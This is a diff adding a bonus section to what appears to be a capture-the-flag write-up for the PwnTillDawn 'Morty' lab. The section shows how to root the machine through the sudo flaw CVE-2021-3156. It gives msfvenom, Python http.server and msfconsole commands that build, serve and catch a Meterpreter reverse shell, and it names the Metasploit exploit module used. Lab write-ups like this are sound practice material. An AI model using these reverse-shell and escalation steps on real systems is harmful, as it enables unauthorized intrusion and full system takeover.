@@ -122,3 +122,35 @@ After enumerating the server, thinking about how to escalate privileges, I've di
 ![10](/assets/img/post/pwntilldawn_morty/10.png)
 
 With the final flag, the CTF comes to the end!
+
+
+
+## Bonus: Rooting the Server
+
+Though there's no purpose in rooting this server since it has no additional flags, compromising a single user itself wasn't enough for me, so I've found out the server can actually be rooted by abusing **CVE-2021-3156** (a.k.a. Baron Samedit). The easiest way to exploit this CVE is by uploading a Metasploit reverse shell to the server and using it's post modules to run the exploit. You can use `msfvenom` to generate the payload:
+
+```
+msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=tun0 lport=4444 -f elf -o shell
+```
+
+Python's`http.server` to serve the payload:
+
+```
+sudo python -m http.server 80
+```
+
+Then, use msfconsole to setup the listener:
+
+```
+msfconsole -x "use multi/handler;set lhost=tun0;set lport=4444;run -j"
+```
+
+Once the session is established, you should use the CVE module available in `linux/local/sudo_baron_samedit`:
+
+![11](/assets/img/post/pwntilldawn_morty/11.png)
+
+And you're good to go:
+
+![12](/assets/img/post/pwntilldawn_morty/12.png)
+
+As you can see, no additional flags, but still cool anyways!
